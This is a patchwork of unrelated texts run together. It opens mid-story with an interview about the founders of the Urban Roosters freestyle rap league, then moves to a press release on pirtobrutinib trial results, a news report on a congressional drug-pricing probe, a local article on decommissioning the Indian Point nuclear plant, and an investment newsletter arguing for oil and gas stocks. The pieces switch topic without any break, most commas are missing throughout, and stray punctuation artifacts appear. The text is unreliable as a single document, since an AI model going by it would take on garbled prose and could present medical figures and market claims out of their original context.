The duo offered it to their clients to no success. After several failed pitches their boss began to look at them differently: “The next time you pitch this you’ll be out of a job!” – he told them.

But the seed was already planted. The vision of freestyle as a sporting discipline was fixed in the minds of Asier and Pedro. The challenge now was to find the intersection with the cultural side of it all.

And so Urban Roosters was born. But not without hard work and perseverance; the last man standing is the one who prevails.

""We were convinced of what we needed to become what we are today"" he says convinced.

Pedro and Asier insisted with other clients appeared in incubators closed with accelerators built synergies with various organizations…

""Competitiveness was well received"" he recalls.

Meanwhile the group of creatives continued to refine the idea during the weekends. ""We got stubborn"" he says.

“We submitted it to a contest and they chose us out of 900 projects. That gave us a lot of momentum. We quickly found a capitalist partner an investor. We went to represent Spain at the Entrepreneurs' World Cup. Those trips blew our minds.”

- From a management standpoint would you do something different?

""I think it wasn’t right to give so much equity to a business angel. That of ‘taking capital and giving a lot.’ Knowing what I know now I wouldn't have done it that way. Our capital did not last long the money was little and what we delivered was a lot. The equity partner at the time got a good deal.”

The First Steps Of A Fabulous Business

As time went by the business fire was igniting. Ultimately it would be a half-year pass through the famous Startup Chile incubator that would provide the missing wood.

“We started ranking different competitions. We checked if they had a prize in money repercussion trajectory. We categorized all of this and assigned points” he recalls.

It was 2015 and the foundations for the Freestyle Federation were being laid.

""We professionalize the system"" continues Fernández.

In short the idea of ​​a professional league had to be realized with the best competitors. However they found that freestyle has a subjective notion. So to organize competitions they decided to innovate with two elements that are central to the differential of their business: voting and format.

“You had to objectify the discipline a bit. With the Freestyle Master Series we are looking for a more complete freestyle” he assures.

With this in mind the duo launched a first FMS pilot in Spain and it was in his words ""the first that supported turning this into a profession."" This first league lit the aspirational fuse for thousands of young people.

Following the Spanish success the league traveled to Argentina.

""It was an uphill battle at first. But now Argentina is our flagship league our battle horse"" he voices.

The following year Mexico and Chile arrived. And in 2020 the Peruvian league was added.

— What was the key point of the success of the business?

“The repercussion. And it coincided with the phase in which we were in the accelerator. We learned to focus. The best thing we had was that: learning to do what was necessary just freestyle. With this the FMS emerged and I think it was a key point.

Challenges And New Coordinates

Nowadays professional competitions are becoming popular all over the world. ""Freestyle competitions have existed since rap has existed.""

Asier asserts: “In Japan they are just as developed as we are. In Brazil they are about to explode. And then we are seeing that it is going global. In Germany a league came out with the same FMS concept. Deep down everyone is competing for more views. We would like to re-introduce competitive freestyle in the United States done our way.”

Among the main challenges the FMS went through different stages. The first had to do with growing in audience achieving repercussion and gaining recognition.

Then it was time to get funding. ""They told us: 'good but how will they monetize it?'""

It became necessary to validate the project with the support of mainstream brands. But which ones would be interested in freestyle?

“In the second year of the Spanish league we got JD Sports to join us as a sponsor. That confirmed that there were brands that were ready ”he recalls.

With this the conventions of street rap and its stereotypes began to be erased. A new hip-hop business narrative was beginning to be written.

“That was a major change. Other brands started to trust us and we got more financing ” he explains.

— And what happened to the other players in the sector?

“We have competed hard with Red Bull because our resources are different. We have been able to take advantage of that momentum get in the wheel and generate an impact with different campaigns at different times. We had micro battles that were taking their toll. It has been difficult because Red Bull is a giant.

— How did you manage to add Red Bull: Batalla de los Gallos your competitor’s flagship to your scoring system?

""It was evolution itself. Red Bull was always the competition but it had a great talent exile problem. It offered you a showcase but since you didn't collect a salary once you won there wasn’t much incentive to return. To do so was to lose face. We managed to create stability for the boys. We knew that this was going to have an impact on the competitors and on the discipline itself. It was strategically in the face of the competition. If all that hadn't happened we wouldn't be here today. Everything also happened because of the competition with Red Bull because we could have given up. It was a tough time but it served us like gasoline.

Make It Real

Currently Urban Roosters maintains about 250 stable jobs plus all the fluctuations that appear with live events and other peripheral businesses.

""In 2020 we settled into profitability"" says Asier. “After five years of uninterrupted growth in 2019 we were on the verge of reaching that point. COVID turned us upside down. We were perfect and it was like erasing everything"" he says.

Due to the economic crisis Urban Roosters lost sponsors stopped cutting tickets and succumbed to its projection as a business model.

""We wanted to stop depending on ticketing but 70% of our income as a company came from there"" he acknowledges.

This shock made them reconvert integrate with other types of contracts sell television rights and content generation. They also raised more money.

And it seems the jump was qualitative. ""It is a moment very important"".

He expands: “Other producers see the business in the short-term. We are long-term oriented. But for that you have to invest.”

Urban Roosters’ growth is steady. However despite being the largest in the market compared to emerging verticals such as e-sports (another of the trend sports) the turnover is not exorbitant: “In 2016 we had a turnover of 16000 euros. In 2017 200000. By 2018 700000. And in 2019 about 2.4 million.”

2020 and 2021 were tough years but the guys made it through. “In 2021 we’ll make around 2.4 million euros as well but with only one in person show. In 2019 80% of our revenue came from ticket sales but now our model has pivoted.”

With the return to live in person shows ticket sales are expected to go through the roof and with them Urban Roosters’ 2022 profit.

The co-founders also promise new leagues down the line: Andes (for Venezuela Ecuador Bolivia and Colombia) Brazil Portugal Caribbean and the U.S. A second division of the league in certain countries is also in the cards.

- Why does everyone want to get involved in some way or another with the FMS?

“Because we have the repercussion and great reach. But something that characterizes the league is that it ends up being like a soap opera. It is a consumption that is dosed over time. And the spectators are accompanying everything that happens.

“In the past content’s shelf life was about a month. Now it’s more like one week.

“In addition the FMS narrative has spectators following the “Warrior’s Path:” Someone who starts off badly and starts to grow. And from that merit they achieve success.

Meanwhile that “Warrior’s Path” also had its exoduses: young people who showed their talent in the different leagues and made the leap to other disciplines. Or they simply retired.

“We are in a moment of transition between an old vision and a new one” Asier concludes. “There are guys who although very young have been in the industry for many years. And they have an ancient vision of being an Eminem succeeding in music. And there are guys who want to be freestylers and not musicians. There is going to be an exodus of talent we know that. And as with any sport the great stars must accompany. Having a Messi is a fundamental part for him to connect with different generations. But the novelty is something that really captivates the public.”

Pirtobrutinib is an investigational highly selective non-covalent (reversible) Bruton's tyrosine kinase (BTK) inhibitor. These data are being presented in oral presentations at the 2021 American Society of Hematology (ASH) Annual Meeting (abstracts 391 and 381).

""BRUIN is now the largest clinical trial conducted to date that has enrolled CLL/SLL patients previously treated with modern standards of care including BTK and BCL2 inhibitors. In this real-world population of relapsed/refractory patients pirtobrutinib continues to demonstrate robust activity with a safety profile amenable to chronic administration. Now with the longer follow-up that this analysis affords we are encouraged by evidence of durable disease control in this very heavily pretreated CLL/SLL population"" said Anthony Mato  M.D. MSCE director of the CLL Program at Memorial Sloan Kettering Cancer Center and a presenting author. ""As recently detailed by a global panel of experts in Clinical Cancer Research  there are currently no evidence-based treatment options for patients following covalent BTK and BCL2 inhibitor therapy. Pirtobrutinib has the potential to offer a meaningful new approach for these CLL/SLL patients as well as those patients who are less heavily pretreated.""

""I'm pleased to share the pirtobrutinib data in MCL patients with the hematology community at ASH"" said Michael Wang  M.D. Puddin Clarke Endowed Professor of Lymphoma and Myeloma at The University of Texas MD Anderson Cancer Center and a presenting author. ""Since our last analysis of these data we have doubled the number of evaluable BTK pretreated patients and observed a nearly-identical response rate. New treatment options following covalent BTK therapy represent an area of urgent unmet need and the durable response rate observed with pirtobrutinib demonstrates its potential to provide a significant clinical advancement for patients with MCL following covalent BTK therapy.""

Key Data Presented at ASH

As of July 16 2021  618 patients were enrolled in the study including 296 with CLL/SLL 134 with MCL and 188 with other B-cell malignancies. The efficacy data presented at ASH are based on investigator response assessments. Patients were considered efficacy-evaluable if they had at least one post-baseline response assessment or if they discontinued treatment prior to their first post-baseline response assessment.

Chronic lymphocytic leukemia (CLL)/Small lymphocytic lymphoma (SLL)

Among the 296 CLL/SLL patients enrolled 261 were previously treated with a BTK inhibitor and are the subject of this analysis. The median number of prior lines of therapy was three with 100% receiving a prior BTK inhibitor 88% an anti-CD20 antibody 79% chemotherapy 41% venetoclax 20% a PI3K inhibitor 6% CAR-T therapy and 2% stem cell transplant.

In 252 efficacy-evaluable patients (an additional nine patients ongoing prior to first restaging) 171 responded including two complete responses (CR) 137 partial responses (PR) 32 partial responses with ongoing lymphocytosis (PR-L) and 62 stable disease (SD) resulting in an overall response rate (ORR) of 68% (95% CI: 62-74). Responses continue to deepen over time with the ORR rising to 73% (88/119) for those followed 12 months or more and ORR remains consistent regardless of reason for prior BTK discontinuation type or number of prior therapies or BTK C481 or PCLG2 mutational status.

Pirtobrutinib demonstrated evidence of durable activity with a median progression-free survival (PFS) not reached in patients who had received at least a prior BTK inhibitor (lower limit of 95% confidence interval of 17.0 months median of three prior lines of therapy). In patients who had received at least a BTK inhibitor and BCL2 inhibitor (median of five lines of prior therapy) the estimated median PFS was 18 months although these data remain immature and unstable due to the small percentage of patients with progression. As of the data cut-off 74% (194/261) of BTK pre-treated patients remained on pirtobrutinib. Median follow-up for all BTK pre-treated patients was 9.4 months (range 0.3-27.4 months).

In an exploratory analysis in patients with prior progression on a BTK inhibitor the PFS with pirtobrutinib was similar in patients with BTK C481-mutated and BTK C481-wildtype CLL and SLL.

Mantle cell lymphoma (MCL)

The 134 patients with MCL received a median of three prior lines of therapy with 90% receiving a prior BTK inhibitor 97% an anti-CD20 antibody 91% chemotherapy 22% stem cell transplant 17% immunomodulatory (IMiD) drugs 15% venetoclax 13% proteasome inhibitor 5% CAR-T cell therapy and 4% PI3K inhibitor.

Of the 100 efficacy-evaluable patients with BTK pre-treated MCL (an additional 23 patients ongoing prior to first restaging 11 patients had not received a prior BTK inhibitor) 51 responded including 25 CRs and 26 PRs resulting in an ORR of 51% (95% CI: 41-61). Among 11 BTK naïve MCL patients nine responded including two CRs and seven PRs resulting in an ORR of 82% (95% CI: 48-98). Responses in MCL were observed in patients who received prior stem cell transplant and prior CAR-T therapy.

Median duration of response was 18 months (lower limit of 95% confidence interval of 4.6 months). Median follow-up for all responding MCL patients was 8.2 months (range of 1.0-27.9 months) with 60% (36/60) of responses ongoing as of the data cut-off.

Safety data were presented for the entire enrolled BRUIN population. Across all 618 patients enrolled in the study the most commonly reported adverse events regardless of attribution were fatigue (23%) diarrhea (19%) neutropenia (18%) and contusion (17%). In addition adverse events commonly associated with covalent BTK inhibitors occurred at a low rate with the majority being Grade 1 or 2. During the Phase 1 dose escalation no dose limiting toxicities were reported and a maximum tolerated dose (MTD) was not reached. Permanent discontinuations for drug-related adverse events were observed in 1% (n=6) of patients.

""As the pirtobrutinib data continue to mature we remain extremely excited by its potential to meaningfully improve the treatment landscape for patients with CLL SLL and MCL"" said David Hyman  M.D. chief medical officer oncology at Lilly . ""We have initiated a robust Phase 3 program for pirtobrutinib and look forward to further exploring its potential as monotherapy in combination and in earlier lines of therapy.""

Real-world evidence studies

A real-world evidence database study on outcomes for patients with CLL previously treated with a covalent BTK inhibitor and a BCL2 inhibitor will be presented in a poster presentation on Monday December 13 from 6-8 p.m. ET (abstract 3743). Additionally a study on outcomes for patients with MCL following covalent BTK inhibitor therapy was published as an online-only abstract (abstract 4523).

Loxo Oncology at Lilly is studying pirtobrutinib in multiple Phase 3 studies. Details on the trials can be found in Trials in Progress posters (abstracts 2422 3732 3736 and 3742) and on lillyloxooncologypipeline.com.

About Pirtobrutinib (LOXO-305)

Pirtobrutinib is an investigational highly selective non-covalent (reversible) Bruton's tyrosine kinase (BTK) inhibitor. BTK plays a key role in the B-cell antigen receptor signaling pathway which is required for the development activation and survival of normal white blood cells known as B-cells and malignant B-cells. BTK is a validated molecular target found across numerous B-cell leukemias and lymphomas including chronic lymphocytic leukemia mantle cell lymphoma Waldenström macroglobulinemia and marginal zone lymphoma. Currently available covalent BTK inhibitors irreversibly inhibit BTK and the long-term efficacy of these therapies can be limited by acquired resistance most commonly through BTK C481 mutations. In rapidly growing tumors with inherently high rates of BTK turnover resistance to covalent BTK therapies may be the result of incomplete target inhibition. Pirtobrutinib was designed to reversibly bind BTK deliver consistently high target coverage regardless of BTK turnover rate preserve activity in the presence of the C481 acquired resistance mutations and avoid off-target kinases that have complicated the development of both covalent and investigational non-covalent BTK inhibitors. Interested patients and physicians can contact the Loxo Oncology at Lilly Physician and Patient BTK Clinical Trial Hotline at 1-855-LOXO-305 or email clinicaltrials@loxooncology.com .

About the BRUIN Phase 1/2 Trial

This first-in-human global multi-center Phase 1/2 trial evaluates pirtobrutinib as a single agent in patients with previously treated chronic lymphocytic leukemia (CLL) small lymphocytic lymphoma (SLL) or non-Hodgkin's lymphomas (NHL). The trial includes a Phase 1 dose escalation phase and a Phase 2 dose expansion phase. The Phase 1 dose escalation enrolls patients with CLL/SLL or NHL who have received at least two prior lines of therapy and have progressed or are intolerant to standard of care. The dose escalation phase followed a ""3+3"" design with pirtobrutinib dosed orally in 28-day cycles. As dose cohorts were cleared additional patients could enroll in cleared cohorts and intra-patient dose escalation was permitted. The primary objective of the Phase 1 portion of the trial is to determine the maximum tolerated dose and recommended Phase 2 dose. Key secondary objectives include measures of safety pharmacokinetics and anti-tumor activity (i.e. Overall Response Rate (ORR) and Duration of Response as determined by appropriate histology-specific response criteria). In the Phase 2 dose expansion patients are enrolled across various cohorts depending on disease type and prior therapy. The primary endpoint for Phase 2 is ORR.

WASHINGTON--Drugmakers have targeted the U.S. market to earn outsized profits from old medicines according to a report released on Friday by the House Oversight Committee that highlighted Eli Lilly and Co Novo Nordisk and Sanofi which dominate the market for insulin.



The staff report also noted pricing and marketing tactics by Pfizer Inc that helped it earn billions of dollars from its now off-patent pain drug Lyrica.

The report put out following a nearly three-year probe took issue with assertions by the pharmaceutical industry that high drug prices were needed to fund innovation and research and development programmes. ""The Committee's investigation also found that companies dedicated a significant portion of their R&D expenditures to research that was intended to extend market monopolies support the companies' marketing strategies and suppress competition"" the report said.

The report which focused on 12 drugs made by 10 companies said that Lilly Novo Nordisk and Sanofi own some 90% of the market for life-sustaining insulin which was invented in the 1920s.

A Lilly spokesperson said the company offers discounts to make its insulin affordable. A Sanofi spokesperson said the price of its insulin product Lantus had declined almost 45% since 2012. A Novo Nordisk spokesperson said the report reflected a limited picture of the company's efforts to make drugs accessible.

Medicare the U.S. government health insurance programme for those age 65 and older and the disabled could have saved more than $16.7 billion from 2011 to 2017 on insulin purchases had it been allowed to negotiate discounts with drug companies the report found.

""We found that drug companies target American patients for price increases in large part because Medicare is prohibited from negotiating for lower prices. At the same time the drug companies maintained or cut prices for the rest of the world"" Committee Chairwoman Carolyn Maloney said at a news conference on Friday.

The high prices have had human costs. More than 40% of insulin-dependent patients surveyed said they rationed their medicine in the previous year the Colorado attorney general's office found in a 2020 report.

President Joe Biden's Build Back Better plan which passed the House and should come before the Senate this year includes a provision allowing Medicare to negotiate with drugmakers although only for a small number of medicines.

The report also found that some pharmaceutical companies engage in what it called ""product hopping"" a practice of making small tweaks to formulations to get a new patent and then switching patients to the newer more expensive version. There are bills before Congress to ban product hopping.",,,

Amy’s group is Safe Indian Point Demolition which she started with husband Dan as a forum for concerned parents like themselves to discuss the safety implications of decommissioning Indian Point and to “serve as an organizing point for holding public officials accountable for their responsibility to public safety.”

***

Indian Point Energy Center the nuclear power plant that has been in Buchanan since 1962 permanently shut down in April 2021. It is now being decommissioned a long and complicated process involving decontaminating and dismantling the facility transporting the nuclear waste and readying the property for other uses.

In May 2021 Indian Point was purchased by Holtec International from Entergy Corporation in a deal that allowed the site to enter immediate decommissioning. Holtec has promised to dismantle the three nuclear reactors and clean up the site (the plant and surrounding 240 acres) in 12-15 years decades faster than expected.

***

Holtec is primarily a nuclear fuel and waste management company. When it applied to purchase Indian Point from Entergy in April 2019 the company had never before decommissioned a nuclear facility.

It is currently in the early stages of decommissioning two other nuclear plants: Oyster Creek in New Jersey (shut down September 2018) and Pilgrim in Massachusetts (shut down May 2019). Indian Point will be the third in its young “fleet.”

While Indian Point is no longer operating as a nuclear facility as was the case when the Hudson River plant was owned and operated by Entergy a significant segment of the surrounding populace — especially those with children enrolled in nearby schools — remains critical and vigilant shifting their focus to safety concerns with the current decommissioning plan.

Holetc has run afoul of authorities and regulators several times in the past few years a checkered history that has served to elevate concerns by local officials and residents about its oversight of the Indian Point decommissioning process.

***

According to Holtec’s Post-Shutdown Decommissioning Activities Report (PSDAR) Indian Point’s used nuclear fuel will be removed from the reactor vessel and placed in the spent fuel pool to cool which has happened.

Once cooled the fuel will be placed in stainless steel canisters and transported by 2024 to the Independent Spent Fuel Storage Facility (ISFSI) on the property. The spent nuclear fuel will be removed by the Department of Energy (DOE) beginning in 2030 and completed by 2061.

The entire process will be monitored at the Federal level by the U.S. Nuclear Regulatory Commission (NRC) and at the state level by the Department of Public Safety (DPS) as well as by the Decommissioning Oversight Board (DOB) which includes local government officials the school district local labor leaders environmental and technical experts and relevant state agencies.

***

NYS Assemblywoman Sandy Galef points out that Holtec’s plan as written does not mention the presence of the natural gas and high-pressure gas pipelines that traverse Indian Point including the 42-inch Algonquin Incremental Market (AIM) pipeline.

In a public comment to the NRC Galef noted “A brazen and cavalier approach to pipeline safety would greatly endanger countless lives of nearby school children residents and Holtec employees working on site. Without mention of the pipeline in the PSDAR one is left to wonder if Holtec is prepared to execute their mission with competence.”

***

Town of Cortlandt Supervisor-Elect Richard Becker agrees that the plan is inadequate and that high-level radioactive waste and high-pressure pipelines “are a potentially hazardous combination and a more proactive assessment is required to separate these two activities.”

New York State Senator Pete Harckham has asked for the AIM pipeline to be shut down during decommissioning but so far Enbridge the pipeline owner has not agreed.

***

Others are not so concerned. NRC spokesman Neil Sheehan explains that the commission “had an expert team examine its safety and it determined that a rupture of the pipeline was unlikely and that even if that were to occur the plant would remain protected.”

Patrick O’Brien of Holtec/SNC–Lavalin’s Comprehensive Decommissioning International says that it does not plan to traverse any of the gas lines on site during the transfer of fuel but if it does steel plating will be laid across the line(s).

Oak Ridge National Labs is currently conducting an independent review of the safety of the pipelines at Indian Point. Tom Congdon Executive Deputy of the New York State Department of Public Service and Chair of the DOB says he is eagerly awaiting the results so they can move forward with the safest plan possible.

David Lochbaum a retired Nuclear Engineer and the DOB’s technical expert explains that the routine releases of radioactivity from plants being decommissioned averaged 36% of the amount being released from operating plants. The amount of radioactivity released from operating plants is itself a small fraction of the amount allowed to be released under federal regulations.

“The threat to the public from routine airborne radiation releases from Indian Point is significantly lessened than it was when the reactor(s) operated” he said.

***

Among the most unsettling aspects of the decommissioning for parents is the plant’s proximity to three buildings in the Hendrick Hudson School District: Hendrick Hudson High School (1.4 miles away) Frank G. Lindsey Elementary (1.35 miles away) and Buchanan-Verplanck Elementary (BV) (0.7 miles away).

Residents of Buchanan are concerned about nuclear waste traveling on their local roads. Patrick O’Brien said the transportation of “low-level waste” from the site is consistent with waste disposal practices when both nuclear units were operating.

The initial truck route is north on Broadway east on Louisa Street onto Route 9. The route avoids Buchanan-Verplank Elementary School Buchanan Pool Village Park and Village Day Camp.

***

Safe Indian Point Demolition — which includes local influencers like Courtney M. Williams a parent activist and co-founder of the Safe Energy Rights Group—has created a list of safety demands.

They include state-of-the-art real-time contamination testing and monitoring to be reviewed by an independent scientist (not affiliated with NRC or Holtec) that will provide a daily positive affirmation of school safety during demolition.

Also specified is a back-up plan in case BV becomes contaminated/uninhabitable during demolition; restricting demolition to the summer months when schools are mostly empty; deep cleaning of schools after demolition activities; and closing the flow of natural gas lines while heavy machinery is operating above.

***

O’Brien assures that the demolition of the facility will occur “in a surgical manner following federal and state standards which includes our use of technology to ensure dust mitigation.” Additionally before the buildings and structures are removed they will be cleaned and abated of hazards such as asbestos lead paint and organic chemicals like PCB.

New York Governor Kathy Hochul’s office recently sent $500000 to the Hendrick Hudson School District to help with radiation monitoring costs.

Carol Abraham Hendrick Hudson’s Board of Education President says the district will begin meeting with technical experts as soon as possible to discuss the best use of these funds to ensure that additional individualized safety measures are taken at all five of its schools.

This newsletter examines the history and current state of the global oil market and makes the case for decent performance from oil and gas stocks during the 2020s decade.

It’s not a trading call in the sense that all sorts of variables such as virus variants and government policies and OPEC+ decisions can affect any given 6-12 month period. But rather it’s a look into the structure of the market itself with a view over a multi-year commodity cycle.

The Central Importance of Oil

For better or worse it’s hard to overstate how important oil gas and coal are for the world’s energy mix:

Chart Source: Our World in Data

Together fossil fuels represent about 79% of global energy consumption. Wind turbines and solar panels together are only about 3% (and are made using fossil fuels). The rest consists of biomass hydro nuclear and other forms of energy which we mostly build using construction vehicles that run on fossil fuels and that were manufactured using fossil fuels.

What makes fossil fuels so powerful is that they have high energy density and a high energy return on investment since they represent stored-up solar energy from ages long past.

Nuclear hydroelectric geothermal and fossil fuels use stored-up and/or concentrated energy in various ways either atomic gravitational or chemical. Most other types of power production such as wind and solar instead try to harness nature’s current work flow rather than letting nature present it in a denser form which is why they have challenges related to intermittency as well as high costs (including additional environmental costs) when you take into account the storage that is needed to reduce that intermittency.

I wrote a public research piece about this in June 2021 and since then we’ve seen energy crises in Europe and China faster than I would have guessed.

Europe for example has had major issues getting enough natural gas lately resulting in a massive and relatively persistent price spike:

Tapping into dense forms of energy is what allowed for a period of exponential technological gain average human lifespan extension and global poverty reduction.

With vehicles we could travel far distances and mechanize our agriculture so that ten people could harvest enough food to feed a thousand people which freed the other 990 people to be productive elsewhere and create new things. With pumps we could provide most people with clean water and sanitation which vastly reduced disease transmission. With electricity we could power our homes with all sorts of machines that keep our food cold wash our clothes and provide us with light during the night as well as power factories that produce complex things very cheaply. With natural gas we could heat our homes in the winter months and generate electricity to cool our homes in the summer months.

Plus petrochemicals are used for a surprising number of materials we interact with:

Chart Source: Enterprise Products Partners 3Q 2021 Presentation

This chart shows that global GDP (which is adjusted for inflation) broke out basically along the same trend as our fossil fuel use when humanity began using coal and oil:

Chart Source: Our World in Data

For many centuries to the extent that data can be estimated economies grew rather slowly. And then like a light switch turning on humans figured out how to find and harness the power of these dense energy sources and economic growth has been exponential ever since.

Each individual barrel of oil literally contains years of human labor when you break it down quantitatively.

Specifically a barrel of oil can be used to send a medium-sized car 280 miles plus send a large truck 50 miles plus power a home for a couple days plus make a huge variety of products with the rest of it.

If we simplify that list and think in terms of purely how many joules of energy are in a barrel of oil rather than the actual refining breakdown into all of those parts (gasoline diesel propane petrochemicals and so forth) a barrel of oil contains enough energy to send a small car close to 1000 miles. Imagine how many human labor hours it would take for a group of people to push a car 1000 miles.

The average American consumes over 20 barrels of oil per year in various ways plus even more than that from other forms of energy combined like gas oil hydroelectric and more. The average American therefore has an unfathomable amount of human labor equivalents helping them in their lives like enough labor to push a small vehicle around the circumference of the Earth once or twice each year. All of this labor is mostly in machine form and so we don’t necessarily realize how much work is being done for us. The numbers vary by country but even in many developing countries people have a tremendous amount of work being done for them due to fossil fuels.

This comes with major costs of course. Coal emits particulates which contribute to smog oceanic mercury and other environmental problems. Gasoline-powered vehicles emit particulates in densely-crowded cities. Coal oil and gas all emit CO2 into the atmosphere and atmospheric levels of CO2 have broken out to more than a million-year high which is above any normal cycle. We have to go back a lot further to find levels this elevated:

Chart Source: NASA

Plastics made from petrochemicals are spilling into our oceans at an alarming rate. Fertilizers vehicles and other modern agriculture techniques powered from petrochemicals are resulting in big monocrop fields thin soil and oceanic dead zones.

All together the world is experiencing a rapid reduction in biodiversity which is a polite way of saying we may be in the sixth mass extinction event in terms of the percentage of total species that are going extinct over a rather compressed time period by evolutionary standards. Not all of that is related to fossil fuels but these fuels certainly increase our power by orders of magnitude to impact global life which can circle back to supporting or not supporting our own lives if we don’t wield that power well.

Basically humanity has relied on high-time-preference thinking for many decades now which means we have aggressively discounted the future in favor of the present. However even for recent attempts to shift towards “renewables” it’s often more like greenwashing or Kabuki theater meaning the efforts are more about looking green than building truly sustainable systems. Solar wind and associated power storage systems still have a ton of shortcomings and we have often deployed them into regions that they are not ideally suited for in order to score “green points”.

The worst case scenario is that this huge boom in the quantity and quality of human flourishing over the past two centuries enabled by fossil fuels all ends up being just an ephemeral spike and that the full costs come back to slam us over the next two centuries.

A moderate case scenario is that humanity’s ability to tap into dense forms of energy eventually hits a plateau for one reason or another (e.g. we run into peak fossil fuel production and don’t get better energy technologies online fast enough). For the past two centuries humans have had a rapidly growing energy/resource pie and still managed to find things to fight wars over. Imagine how conflicts could escalate if that pie stops growing and energy/resources become a zero-sum geopolitical game.

So humans may have a challenging road ahead with energy. Fossil fuels support billions of human lives but do come with costs. Some of those costs are immediate but non-existential (e.g. city atmosphere pollution) some costs are intermediate-term and global (e.g. oceanic mercury) and other costs are long-term but may cause potentially exponential problems (e.g. we might not want to hit 1000+ CO2 parts per million in the atmosphere and aren’t sure of the full consequences for what exactly that means if we do since some of the run-off effects are challenging to model).

The replacements for fossil fuels are not as efficient as often described when you take into account intermittency and storage and how much battery metals are required for those types of solutions (for which the mines are generally environmentally damaging and are dug up and then manufactured using equipment that runs on fossil fuels). As a former electrical engineer I wish these solutions were more efficient but they simply aren’t due to lack of energy density unless we have some major breakthroughs in material science. Instead they are mainly ideal around the margins for complementing our more stable base load power and can be a bigger percentage of power production in certain ideal regions.

New forms of nuclear energy have promise as do some other forms of power generation. The key thing in common is that they tap into a dense energy source that is reliable. And although it’s not yet widely understood if the Bitcoin network continues to be successful bitcoin mining equipment can be integrated into stranded and intermittent energy sources more closely to improve the economics of those energy sources as I described here. In some areas that’s already happening.

I also think the study of carbon will continue to advance. A lot of emphasis is placed on reducing carbon emissions but perhaps not enough emphasis is placed on improving carbon sinks. The world’s soil for example contains 3x as much carbon as the atmosphere and anything we can do to improve soil depth (basically the opposite of modern industrialized monocrop annual farming techniques) may be able to sequester quite a bit of carbon over the long run.

So the ideal case scenario is that humanity continues to harness new forms of dense energy shifts to longer-term thinking and starts doing things in more sustainable ways.

The Five Ages of Oil

From 1870 until 1911 when it was broken up Standard Oil was the dominant oil producer. This can be considered the first age of oil.

Then there were the world wars after which emerged the second age of oil where the “Seven Sisters” controlled the majority of the world’s oil reserves. The term “Seven Sisters” was a reference to the mythological daughters of the titan Atlas and consisted of the seven largest American and British global oil companies many of which were remnants of Standard Oil. They acquired oil reserves internationally and this period lasted until the 1970s.

In 1970 US oil production structurally peaked for the next four decades:

We then entered the third age of oil which was the rise of OPEC which went from the 1970s through the 2000s. State-owned oil companies in the Middle East and elsewhere began to play the dominant role in global oil markets. The US structured its petrodollar system around that focus and since then countless military conflicts have occurred throughout the Middle East some of which certainly influenced by oil and the associated geopolitics around that oil.

For the fourth age of oil starting in the early 2010s cheap money and technology advancements allowed previously uneconomic oil to be recovered. The US resurrected its oil industry in the form of “shale oil”. This by no means became the dominant source of global oil but it was enough to tip the balance and temporarily interfere with OPEC’s control over global oil.

However most of that shale oil was never truly profitable. Shale oil companies were often not free cash flow positive despite making all of this new production; they were issuing debt and equity to drill for oil and then not recouping their full expenses. And because interest rates were so low pensions and investment banks were happy to keep giving them capital. Plus shale oil wells come online quicker but then also deplete quicker. With shale oil the producer has to constantly inject capital to maintain the same level of production let alone grow it.

I contend that we’re entering a fifth age of oil where shale oil will be more restrained (and profitable) and where OPEC+ (including Russia now) is gaining some dominance again but not really growing and not making massive new discoveries either. Various research organizations place the maximum realistic US oil production level at 13-18 million barrels per day before it starts entering a structural decline. It’s possible that prior highs of about 13 million were already the peak but it’s also possible that we’ll reach somewhere in that higher range if high energy prices call for it.

Meanwhile various ESG mandates are preventing large pools of capital from investing in oil and gas companies. Many pensions sovereign wealth funds and other pools of capital are divesting from oil and gas companies or have already done so.

This is making oil and gas companies more prudent with drilling. Unlike the 2010s decade where they kept lighting money on fire to drill unprofitably now many companies are very disciplined with their capital. Their incentives from shareholders are now to be as self-sufficient as possible meaning that new capital expenditures come out of their profitable drilling activities. Rather than wanting to rely on external financing these companies want to pay down debt buy back shares and pay out dividends to shareholders.

EOG Resources Example

I often like to use EOG Resources (EOG) as an example because it was one of the best-performing shale companies in terms of being disciplined with drilling and avoiding too much shareholder capital destruction.

And yet during the shale boom of the 2010s decade EOG still took on billions of dollars in net debt:

And produced negative free cash flow:

In recent years however we can see that it’s a very different story. Their drilling discipline is much higher they rapidly paid down debt and are focusing on being free cash flow positive. They are harvesting from years of investment rather than plowing more and more money into the ground at any price. A lot of the money is going towards dividends now.

And this is the case with most significant oil and gas companies around. Their newer approaches are mostly about restraining production growth strengthening their balance sheets giving capital back to shareholders and in some cases getting into other lines of business like wind turbines and electric charging stations.

Despite record free cash flow and dividend payouts currently and that they are doing a good job of replacing their reserves EOG’s share price is lower than it was 7 years ago. And that’s better than many energy stocks that are below their highs from 13 years ago.

The Takeaway

Considering the fact that valuations in the oil and gas sector remain cheap globally I view the 2020s decade as likely being a decent decade for oil and gas stocks. Demand growth isn’t particularly rapid but it’s the supply side that is interesting. A decade of unprofitable shale oil growth threw energy markets out of balance towards excess supply for a long time but I believe they are getting back into balance and if anything potentially a lack of balance towards high prices and shortages.

This is not a trading call; I have no idea how the Omicron virus variant OPEC+ decisions economic contractions or any other variable could affect demand over a given 6-12 month period. Instead it’s a secular view about the full decade.

The oil sector today looks a lot like the tobacco industry of the 1990s. I hate tobacco stocks because unlike energy they don’t actually serve a public good. All tobacco products do is kill whereas the energy sector comes with environmental downsides but also enables human flourishing.

Back in the 1990s smoking was on the downtrend and people assumed that tobacco stocks would underperform going forward. They were super cheap. What happened? Tobacco stocks went on to outperform over the next few decades. Being cheap made their share repurchases and dividend reinvestments more impactful. They compounded value at a fast rate despite secular stagnation and their prices went up from lack of competition.

I see a similar outcome for oil and gas stocks. I don’t expect raging supply or demand growth but I expect relatively tight supply along with a lot of capital returns.

Here’s the chart of the Nasdaq 100 priced in barrels of oil:

And here’s the log version of the chart that is more clear:

We see over time that the Nasdaq outperforms as tech equities are able to compound value while a commodity cannot. However it goes in big cycles. The 1970s were very commodity-inflationary while the 1980s and 1990s were commodity-deflationary. And then the 2000s were commodity-inflationary again and the 2010s were commodity-deflationary again.

Here’s a chart of the S&P energy sector total return index vs the S&P 500 total return index. When it’s going up that means energy stocks are outperforming and when it’s going down that means energy stocks are underperforming:

In the 1990s the energy sector lagged as Japan and emerging markets ran into growth headwinds.

In the 2000s the US dollar weakened and emerging markets had a growth boom which resulted in a big increase in oil demand.

In the 2010s many countries went through a private sector deleveraging the dollar strengthened emerging market growth slowed and unprofitable US shale oil flooded the market.

